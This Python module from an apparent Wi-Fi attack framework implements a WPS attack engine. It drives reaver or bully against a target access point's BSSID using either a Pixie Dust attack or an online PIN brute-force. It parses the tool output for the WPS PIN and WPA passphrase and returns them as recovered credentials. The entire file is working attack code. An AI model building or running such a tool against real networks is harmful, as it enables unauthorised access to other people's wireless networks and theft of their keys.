"""WPS (Wi-Fi Protected Setup) Pixie Dust & PIN Attack Engine."""

from __future__ import annotations

import asyncio
import logging
import re
import time
from dataclasses import dataclass
from typing import Any

from wafford.core.base import AttackResult, BaseAttack
from wafford.exceptions import AttackError
from wafford.scripts.shell import ShellRunner

logger = logging.getLogger("wafford.core.wps")


@dataclass
class WPSResult:
    """Result of a WPS attack operation."""

    success: bool = False
    bssid: str = ""
    pin: str = ""
    wpa_key: str = ""
    essid: str = ""
    attack_type: str = "pixie_dust"
    duration: float = 0.0
    error: str = ""


class WPSAttack(BaseAttack):
    """WPS Pixie Dust and PIN brute-force attack engine."""

    def __init__(
        self, interface: str, target_bssid: str, channel: int = 1, essid: str = "",
    ) -> None:
        super().__init__(interface)
        self.target_bssid = target_bssid
        self.channel = channel
        self.essid = essid
        self.shell = ShellRunner()
        self._wps_proc: asyncio.subprocess.Process | None = None
        self._output_lines: list[str] = []

    async def _pre_validate(self) -> None:
        await super()._pre_validate()
        has_reaver = bool(self.shell.run("which reaver", timeout=3).ok)
        has_bully = bool(self.shell.run("which bully", timeout=3).ok)
        if not (has_reaver or has_bully):
            raise AttackError(
                "Neither 'reaver' nor 'bully' is installed. Please install reaver or bully."
            )

    async def _execute(self, **kwargs: Any) -> AttackResult:
        attack_type = kwargs.get("attack_type", "pixie_dust")
        timeout_sec = kwargs.get("timeout", 180)
        if attack_type == "pixie_dust":
            return await self.attack_pixie_dust(timeout_sec)
        return await self.attack_pin_brute(timeout_sec)

    async def attack_pixie_dust(self, timeout_sec: int = 180) -> AttackResult:
        """Run WPS Pixie Dust attack using reaver or bully."""
        self._info("Starting WPS Pixie Dust attack on %s (Ch %d)", self.target_bssid, self.channel)
        start_time = time.time()
        pin = ""
        wpa_key = ""
        self._running = True

        self.shell.run(f"iw dev {self.interface} set channel {self.channel}", timeout=5)

        reaver_check = self.shell.run("which reaver", timeout=3)
        if reaver_check.returncode == 0:
            cmd = [
                "reaver",
                "-i", self.interface,
                "-b", self.target_bssid,
                "-c", str(self.channel),
                "-K", "1",
                "-vv",
                "-N",
            ]
        else:
            cmd = [
                "bully",
                self.interface,
                "-b", self.target_bssid,
                "-c", str(self.channel),
                "-d",
                "-v", "3",
            ]

        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            self._wps_proc = proc
            self._processes.append(proc)

            end_time = time.time() + timeout_sec
            while time.time() < end_time and self._running:
                if proc.stdout is None:
                    break
                try:
                    line_bytes = await asyncio.wait_for(proc.stdout.readline(), timeout=1.0)
                    if not line_bytes:
                        break
                    line = line_bytes.decode(errors="replace").strip()
                    self._output_lines.append(line)
                    self._emit("wps.output", {"line": line})

                    pin_m = re.search(r"WPS PIN:\s*['\"]?(\d+)['\"]?", line, re.IGNORECASE)
                    if pin_m:
                        pin = pin_m.group(1)
                    key_m = re.search(r"WPA PSK:\s*['\"]?([^'\"]+)['\"]?", line, re.IGNORECASE)
                    if key_m:
                        wpa_key = key_m.group(1)

                    if pin and wpa_key:
                        break
                except TimeoutError:
                    continue

            if proc.returncode is None:
                proc.terminate()
                try:
                    await asyncio.wait_for(proc.wait(), timeout=3.0)
                except TimeoutError:
                    proc.kill()

            duration = time.time() - start_time
            success = bool(pin and wpa_key)
            msg = (
                f"WPS Recovered! PIN: {pin}, Key: {wpa_key}"
                if success
                else "Pixie Dust attack did not recover WPS credentials."
            )

            self._running = False
            return AttackResult(
                success=success,
                message=msg,
                password=wpa_key,
                time_taken=duration,
                extra={"pin": pin, "wpa_key": wpa_key, "bssid": self.target_bssid},
            )

        except Exception as e:
            logger.error("Pixie Dust attack failed: %s", e)
            self._running = False
            return AttackResult(success=False, message=str(e), time_taken=time.time() - start_time)

    async def attack_pin_brute(self, timeout_sec: int = 600) -> AttackResult:
        """Online WPS PIN brute-forcing."""
        self._info("Starting WPS PIN brute-force on %s", self.target_bssid)
        start_time = time.time()
        pin = ""
        wpa_key = ""
        self._running = True

        cmd = [
            "reaver",
            "-i", self.interface,
            "-b", self.target_bssid,
            "-c", str(self.channel),
            "-vv",
            "-d", "2",
        ]

        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            self._wps_proc = proc
            self._processes.append(proc)

            end_time = time.time() + timeout_sec
            while time.time() < end_time and self._running:
                if proc.stdout is None:
                    break
                try:
                    line_bytes = await asyncio.wait_for(proc.stdout.readline(), timeout=1.0)
                    if not line_bytes:
                        break
                    line = line_bytes.decode(errors="replace").strip()
                    self._output_lines.append(line)
                    self._emit("wps.output", {"line": line})

                    pin_m = re.search(r"WPS PIN:\s*['\"]?(\d+)['\"]?", line, re.IGNORECASE)
                    if pin_m:
                        pin = pin_m.group(1)
                    key_m = re.search(r"WPA PSK:\s*['\"]?([^'\"]+)['\"]?", line, re.IGNORECASE)
                    if key_m:
                        wpa_key = key_m.group(1)

                    if pin and wpa_key:
                        break
                except TimeoutError:
                    continue

            if proc.returncode is None:
                proc.terminate()
                try:
                    await asyncio.wait_for(proc.wait(), timeout=3.0)
                except TimeoutError:
                    proc.kill()

            duration = time.time() - start_time
            success = bool(pin and wpa_key)
            msg = (
                f"WPS PIN Recovered: {pin}, Key: {wpa_key}"
                if success
                else "WPS PIN brute-force completed without recovery."
            )

            self._running = False
            return AttackResult(
                success=success,
                message=msg,
                password=wpa_key,
                time_taken=duration,
                extra={"pin": pin, "wpa_key": wpa_key, "bssid": self.target_bssid},
            )
        except Exception as e:
            self._running = False
            return AttackResult(success=False, message=str(e), time_taken=time.time() - start_time)

    async def _cleanup(self) -> None:
        if self._wps_proc and self._wps_proc.returncode is None:
            self._wps_proc.terminate()
        await super()._cleanup()
